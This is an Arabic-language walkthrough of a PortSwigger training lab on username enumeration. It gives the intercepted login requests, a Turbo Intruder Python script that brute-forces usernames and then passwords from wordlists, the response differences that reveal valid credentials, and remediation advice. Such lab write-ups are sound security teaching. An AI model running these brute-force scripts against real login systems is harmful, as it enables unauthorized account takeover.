# [Username enumeration via different responses](https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-different-responses)

## **`الهدف`**
معرفة اسم المستخدم الصالح من بين قائمة أسماء يوفرها موقع الـ `PortSwigger` ثم القيام بعمل `brute-force` علي كلمة المرور الخاصة بهذا المستخدم وأخيرًا تسجيل الدخول بنجاح إلى حسابه.
## **`خطوات الحل`**
أولًا لن نستعمل أداة `Intruder` العادية الموجودة في الـ `Burp Suite` لأنها بطيئة في النسخة المجانية وبدلًا منها سنستعمل أداة / إضافة `Turbo Intruder` المجانية.

سنقوم بنسخ **[جميع أسماء المستخدمين](https://portswigger.net/web-security/authentication/auth-lab-usernames)** التي يتم توفيرها لنا من قبل الـ `PortSwigger` ونحفظها فى ملف نصي على الـ `Desktop` باسم `username.txt` وكذلك نقوم بنسخ **[جميع كلمات المرور](https://portswigger.net/web-security/authentication/auth-lab-passwords)** التي يوفرها لنا الـ `Portswigger` ونحفظها في ملف نصي على الـ `Desktop` باسم `password.txt`

وسنقوم باعتراض `request` تسجيل الدخول بأى اسم وكلمة مرور عشوائيين

```http
POST /login HTTP/2
Host: 0a800089046f81ea82ff65f9003900eb.web-security-academy.net
Cookie: session=djgetb4ZO1ucSqDnM9w0oFtcHBoHQx11

username=test&password=1234
```
ونقوم بتحويل الـ `request` إلى الـ `Turbo Intruder` ونقوم بوضع `علامة %s (الفراغ / Placeholder القياسي لأداة Turbo Intruder)` بدلًا من اسم `test` ونضع أى كلمة مرور عشوائية. 
```http
POST /login HTTP/2
Host: 0a800089046f81ea82ff65f9003900eb.web-security-academy.net
Cookie: session=djgetb4ZO1ucSqDnM9w0oFtcHBoHQx11

username=%s&password=1234
```

ونقوم بوضع سكريبت بايثون الذي يقرأ الكلمات من الملف الموجود على الـ `Desktop` في مكانه داخل أداة `Turbo Intuder` ونقوم ببدأ الهجوم
```python
def queueRequests(target, wordlists):
    # السماح بأكثر من اتصال متوازي لتسريع العملية
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=3,   
                           # (خمس اتصالات متوازية (يمكن زيادتها حسب الرغبة
                           requestsPerConnection=10, 
                           # عدد الطلبات المرسلة عبر الاتصال الواحد
                           pipeline=False,            
                           # تعطيل الـ pipelining تماماً
                           engine=Engine.THREADED
                           )

    # افتح الملف واقرأ السطور (الكلمات) الموجودة فيه
    # تنبيه: استبدل المسار التالي بالمسار الحقيقي للملف
    with open(r'C:\Users\test\Desktop\username.txt', 'r') as f:
        for line in f:
            # نأخذ الكلمة ونحذف أي مسافات أو سطور زائدة من أطرافها
            word = line.strip()
            
            # إذا كان السطر فارغاً، يتم تخطيه والانتقال للسطر التالي دون إرسال طلب
            if not word:
                continue

            # نُرسل القيمة المقروءة من الملف للجزء المُحدد في الـ Request
            engine.queue(target.req, word)

def handleResponse(req, interesting):
    # عرض كل النتائج في الجدول بدون أي فلترة لكي نتابع كل الطلبات
    table.add(req)
```

وسنلاحظ في النتائج أن هناك اختلاف واحد في الـ `Length` الخاص بـ `request` اسم `accounting` حيث أنه بقيمة `3399` عكس جميع البقية والتي قيمتها `3397` واذا قُمنا بفحص الـ `response` في وضع `render` والذي يعرضه كما يظهر في المتصفح سنلاحظ أن رسالة الخطأ لم تكن `Invalid username` كما في البقية بل كانت `Incorrect password`، وهذا يعنى أن المستخدم موجود بالفعل ولكن كلمة المرور خاطئة.

وننتقل إلى المرحلة التالية في نفس الـ `request` ولكن سنغير مكان علامة `%s` بدلًا من كلمة المرور ونضع `accounting` في الـ `username`

```http
POST /login HTTP/2
Host: 0a800089046f81ea82ff65f9003900eb.web-security-academy.net
Cookie: session=djgetb4ZO1ucSqDnM9w0oFtcHBoHQx11

username=accounting&password=%s
```

وسنستعمل نفس سكريبت بايثون السابق ولكن بتغير مسار الملف واختيار الملف الذي قمنا بحفظ كلمات المرور به

لنلاحظ أن كلمة مرور `monitor` قد عادت برقم `302` في خانة الـ `Status code` وهذا يعنى أنها ناجحة عكس البقية الذين كانوا برقم `200`

لذلك نقوم بالعودة إلى اللاب وتسجيل الدخول إلى حساب `accounting:monitor` لننتهي من حل اللاب.

**`ملاحظة هامة:`** يُمكن حل هذا اللاب أو  أي لاب تدور فكرته عن تخمين اسماء المستخدمين الصالحة وكلمات المرور عن طريق هجوم `brute-force` واحد باستخدام `(هجوم قنبلة عنقودية واحدة)` وهذا يعنى تخمين الأسماء وكلمات المرور في مرة واحدة، ولكن هذا يأخذ وقت أطول بالإضافة إلى أنه أكثر تعقيدًا لذلك من الأفضل حصر أسماء المستخدمين الصالحة أولًا إن أمكن وبعد ذلك نقوم بعمل هجوم `brute-force` لكلمات المرور.
## **`ترقيع الثغرة`**
يجب أن تكون رسالة الخطأ مُبهمة`Generic` بدلًا من إخبار المستخدم أن الاسم غير موجود أو كلمة المرور خاطئة، بحيث يُعرض رسالة ثابتة مثل: اسم المستخدم أو كلمة المرور غير صحيحة وبهذا لا يستطيع المهاجم معرفة أى الجزأين هو الخاطئ ولن يلاحظ أي اختلاف في الـ `Length` لأنه سيبقى ثابت في جميع المحاولات.

ويجب أن يُطلب من المستخدم حل كابتشا `(CAPTCHA)` بعد كل محاولتين أو ثلاث خطأ لإثبات أنه إنسان وليس اداة.

ويجب إضافة المصادقة الثنائية `Multi-Factor Authentication - MFA` حتى لا يستطيع المهاجم الدخول إلى الحساب حتى بعد معرفة اسم المستخدم وكلمة المرور.

ويجب وضع حماية ضد كثرة الطلبات لأن الوضع الحالي للموقع هو `No Rate Limiting.`
